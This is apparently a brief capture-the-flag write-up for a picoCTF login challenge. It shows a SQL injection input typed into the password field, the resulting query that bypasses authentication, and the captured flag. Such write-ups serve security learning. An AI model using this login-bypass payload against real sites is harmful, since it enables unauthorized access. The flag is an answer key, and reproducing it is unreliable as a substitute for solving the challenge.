## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!
## Solución
```
username: admin 
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin ' AND password='' or 1==1;'
 # Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}
```
## Notas adicionales

## Referencias